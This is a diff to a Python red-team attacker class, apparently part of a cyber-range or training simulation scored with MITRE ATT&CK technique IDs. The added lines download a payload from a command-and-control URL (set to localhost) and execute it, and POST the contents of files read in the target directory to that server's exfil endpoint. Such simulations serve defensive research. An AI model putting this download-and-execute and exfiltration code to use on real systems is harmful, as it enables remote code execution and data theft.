@@ -15,6 +15,8 @@ import sys
 import logging
 import subprocess
 import shutil
+import urllib.request
+import urllib.parse
 
 # Adjust path to find utils in parent directory
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -28,6 +30,7 @@ LOG_FILE = os.path.join(BASE_DIR, "red.log")
 TARGET_DIR = "/tmp"
 PORTS_DIR = "/tmp/ports"
 PAYLOAD_TEMPLATE = os.path.join(BASE_DIR, "payloads", "malware.py")
+C2_URL = "http://127.0.0.1:8888"
 
 # --- HYPERPARAMETERS ---
 # Increased weight of Ransomware and Masquerade in the action set via logic tweaks if needed,
@@ -142,17 +145,21 @@ class RedAttacker:
                     except OSError: pass
 
                 elif action == "T1204_USER_EXECUTION":
-                    # Drop AND EXECUTE a live payload
+                    # Download AND EXECUTE a live payload from C2
                     fname = os.path.join(TARGET_DIR, f"malware_live_{uuid.uuid4()}.py")
                     try:
-                        shutil.copy2(PAYLOAD_TEMPLATE, fname)
+                        # Emulate "Curl | Bash" style download
+                        with urllib.request.urlopen(f"{C2_URL}/payload") as response:
+                            payload_code = response.read()
+                            with open(fname, 'wb') as f: f.write(payload_code)
+
                         # Execute it!
                         proc = subprocess.Popen([sys.executable, fname], cwd=TARGET_DIR)
                         self.active_beacons.append(proc.pid)
-                        self.logger.info(f"Executed live payload! PID: {proc.pid}")
+                        self.logger.info(f"Downloaded & Executed payload from C2! PID: {proc.pid}")
                         impact = 8
                     except Exception as e:
-                        self.logger.error(f"Failed execution: {e}")
+                        self.logger.error(f"Failed C2 Download/Exec: {e}")
 
                 elif action == "T1589_LURK":
                     impact = 0
@@ -204,13 +211,15 @@ class RedAttacker:
                                                 with open(entry.path, 'r') as f: content = f.read()
                                             except: pass
 
-                                        # Exfil the last read
-                                        exfil_path = os.path.join(TARGET_DIR, f"EXFIL_{entry.name}_{uuid.uuid4()}")
-                                        safe_file_write(exfil_path, content)
+                                        # Exfil via Network (POST to C2)
+                                        try:
+                                            req = urllib.request.Request(f"{C2_URL}/exfil", data=content.encode('utf-8'))
+                                            with urllib.request.urlopen(req) as resp:
+                                                pass # Success
+                                        except: pass
 
                                         if "JUNK_DATA" in content:
-                                            # We got shadow banned!
-                                            impact = -5 # Failed
+                                            impact = -5 # Shadow banned
                                         else:
                                             impact = 4 # Success
                     except Exception: pass
